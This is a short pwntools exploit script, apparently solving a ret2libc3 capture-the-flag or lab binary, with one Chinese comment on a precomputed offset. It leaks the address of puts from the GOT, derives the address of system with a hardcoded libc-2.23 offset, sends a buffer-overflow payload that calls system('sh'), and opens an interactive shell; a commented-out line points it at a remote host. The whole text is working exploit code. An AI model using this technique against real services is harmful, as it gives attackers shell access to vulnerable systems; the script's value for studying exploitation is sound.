from pwn import *

#io = remote("192.168.3.102",10001)
io =process('./ret2libc3')
elf = ELF("./ret2libc3")
libc = ELF("libc-2.23.so")
io.sendlineafter(b" :",str(elf.got['puts']))
io.recvuntil(b" : ")
# 我直接把差求出来了，用elf.symbol【'puts'】做差是一样的
sys_plt = int(io.recvuntil(b"\n",drop = True),16) - 149504
payload = flat(cyclic(60), sys_plt, cyclic(4), next(elf.search(b"sh\x00")))
io.sendlineafter(b" :",payload)
io.interactive()
